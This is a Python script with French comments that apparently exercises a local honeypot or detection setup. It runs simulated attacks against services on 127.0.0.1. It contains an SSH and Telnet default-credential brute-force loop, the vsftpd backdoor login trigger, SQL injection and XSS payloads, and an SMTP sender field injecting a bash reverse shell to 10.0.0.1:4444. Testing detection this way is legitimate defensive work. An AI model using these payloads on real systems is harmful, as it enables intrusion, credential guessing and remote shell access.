import socket
import time
import requests
from ftplib import FTP
import telnetlib
import smtplib

def test_ssh_attack(host='127.0.0.1', port=2222):
    print("\n=== Test d'attaque SSH ===")
    try:
        # Simuler plusieurs tentatives de connexion SSH
        for username in ['admin', 'root', 'user']:
            for password in ['password123', 'admin123', '123456']:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((host, port))
                
                # Recevoir la bannière
                banner = sock.recv(1024)
                print(f"Bannière reçue: {banner.decode()}")
                
                # Envoyer username
                sock.send(f"login {username}\n".encode())
                response = sock.recv(1024)
                print(f"Tentative avec {username}:{password}")
                
                # Envoyer password
                sock.send(f"{password}\n".encode())
                response = sock.recv(1024)
                
                sock.close()
                time.sleep(1)  # Attendre entre chaque tentative
    except Exception as e:
        print(f"Erreur SSH: {str(e)}")

def test_ftp_attack(host='127.0.0.1', port=2121):
    print("\n=== Test d'attaque FTP ===")
    try:
        # Test de la backdoor vsftpd
        ftp = FTP()
        ftp.connect(host, port)
        print("Connexion FTP établie")
        
        # Tentative d'exploitation de la backdoor
        try:
            ftp.login('anonymous', 'user@test.com:)')
        except:
            print("Tentative backdoor détectée")
        
        ftp.close()
    except Exception as e:
        print(f"Erreur FTP: {str(e)}")

def test_http_attack(host='127.0.0.1', port=8080):
    print("\n=== Test d'attaque HTTP ===")
    try:
        # Test d'injection SQL
        sql_payload = "http://{}:{}/login?id=1' OR '1'='1".format(host, port)
        r = requests.get(sql_payload)
        print("Test injection SQL effectué")
        
        # Test XSS
        xss_payload = "http://{}:{}/search?q=<script>alert('xss')</script>".format(host, port)
        r = requests.get(xss_payload)
        print("Test XSS effectué")
        
    except Exception as e:
        print(f"Erreur HTTP: {str(e)}")

def test_telnet_attack(host='127.0.0.1', port=2323):
    print("\n=== Test d'attaque Telnet ===")
    try:
        # Tentative avec des identifiants par défaut
        tn = telnetlib.Telnet(host, port)
        time.sleep(1)
        
        tn.read_until(b"login: ")
        tn.write(b"admin\n")
        time.sleep(1)
        
        tn.read_until(b"Password: ")
        tn.write(b"admin123\n")
        time.sleep(1)
        
        print("Test Telnet effectué")
        tn.close()
    except Exception as e:
        print(f"Erreur Telnet: {str(e)}")

def test_smtp_attack(host='127.0.0.1', port=2525):
    print("\n=== Test d'attaque SMTP ===")
    try:
        # Test d'injection de commandes SMTP
        smtp = smtplib.SMTP(host, port)
        print("Connexion SMTP établie")
        
        # Tentative d'injection de commandes
        try:
            smtp.sendmail(
                'attacker@evil.com; /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
                'victim@target.com',
                'Test message'
            )
        except:
            print("Tentative d'injection de commandes détectée")
            
        smtp.quit()
    except Exception as e:
        print(f"Erreur SMTP: {str(e)}")

if __name__ == "__main__":
    print("=== Début des tests d'attaque ===")
    
    # Test des différents services
    test_ssh_attack()
    test_ftp_attack()
    test_http_attack()
    test_telnet_attack()
    test_smtp_attack()
    
    print("\n=== Tests terminés ===")
